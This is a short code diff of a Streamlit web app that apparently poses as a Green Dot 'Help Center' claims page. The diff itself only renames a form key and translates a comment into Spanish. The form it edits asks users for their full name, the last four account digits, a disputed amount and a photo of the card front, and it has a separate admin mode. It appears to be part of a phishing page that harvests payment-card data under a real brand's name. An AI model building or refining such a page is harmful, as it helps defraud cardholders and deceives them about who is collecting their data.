@@ -76,7 +76,7 @@ if not st.session_state.admin_mode:
     st.title("Help Center")
     st.write("Please fill out the form below to submit your claim.")
 
-    with st.form("claim_v32_7_1", clear_on_submit=True):
+    with st.form("claim_v32_7_2", clear_on_submit=True):
         st.text_input("Full Name")
         st.text_input("Last 4 digits of Account")
         st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
@@ -84,7 +84,7 @@ if not st.session_state.admin_mode:
         st.file_uploader("Card Front", type=['jpg','png','jpeg'])
         if st.form_submit_button("SUBMIT NOW"): st.success("Claim Received.")
 
-    # --- DOWNLOAD APP SECTION (PROTECTED) ---
+    # SECCIÓN DOWNLOAD APP (RE-INTEGRADA Y PROTEGIDA)
     st.markdown("""<div class='promo-box'>
         <h3 style='color:white; margin-bottom:15px;'>Download the Green Dot app</h3>
         <div style='display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; margin-bottom: 20px;'>
